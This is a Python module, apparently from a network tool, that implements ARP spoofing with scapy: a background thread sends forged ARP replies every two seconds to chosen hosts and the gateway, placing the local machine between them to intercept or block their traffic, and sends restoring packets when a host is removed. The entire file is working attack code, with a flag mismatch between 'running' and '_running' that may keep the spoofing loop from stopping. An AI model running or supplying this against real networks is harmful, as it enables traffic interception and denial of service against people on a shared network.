import sys, time
import threading
from scapy.all import (conf,
ARP,
Ether,
sendp,
get_if_hwaddr,
getmacbyip)

from .host import Host
from sword.network_modular.get_network_info_modular import (get_gateway,
get_ifaces,
get_local_host)

GATEWAY = 0
TARGET = 1

class Arp_Spoof(object):
    def __init__(self) -> None:
        conf.verb = 0
        iface = get_ifaces()
        gateway_ip = get_gateway()
        self._local_mac       = get_if_hwaddr(iface)
        self._local_ip        = get_local_host()
        self._gateway_ip      = gateway_ip
        self._gateway_mac     = getmacbyip(gateway_ip)

        self._running = False

        self._hosts_list = set()
        self._lock = threading.Lock()

    
    def add(self, host: Host):
        with self._lock:
            self._hosts_list.add(host)

        host.block = True

    def remove(self, host: Host):
        with self._lock:
            self._hosts_list.discard(host)

        self._send_free_package(host)

        host.block = False

    def _send_free_package(self, host: Host):
        '''
        construct data package.
        '''
        free_packages = [Ether(src=self._gateway_mac)/ARP(psrc=self._gateway_ip, pdst=host.ip, op=2),
        Ether(src=host.mac)/ARP(psrc=host.ip, pdst=self._gateway_ip, op=2)]
        
        sendp(free_packages[GATEWAY])
        sendp(free_packages[TARGET])
    
    def _send_spoof_package(self, host: Host):
        spoof_packages = [Ether(src=self._local_mac, dst=host.mac)/ARP(psrc=self._gateway_ip, pdst=host.ip, op=2),
        Ether(src=self._local_mac, dst=self._gateway_mac)/ARP(psrc=host.ip, pdst=self._gateway_ip, op=2)]

        sendp(spoof_packages[GATEWAY])
        sendp(spoof_packages[TARGET])

    def _spoof(self) -> None:
        while self.running:
            self._lock.acquire()
            hosts = self._hosts_list.copy()
            self._lock.release()

            for host in hosts:
                self._send_spoof_package(host)

            time.sleep(2)
    
    def start(self) -> None:
        self.running = True
        spoof_thread = threading.Thread(name='spoof_thread',
        daemon=True,
        args = [],
        target=self._spoof)

        spoof_thread.start()

    def stop(self) -> None:
        self._running = False
        self._lock.acquire()
        hosts = self._hosts_list.copy()
        self._lock.release()

        for host in hosts:
            self.remove(host)
        

if __name__ == '__main__':
    pass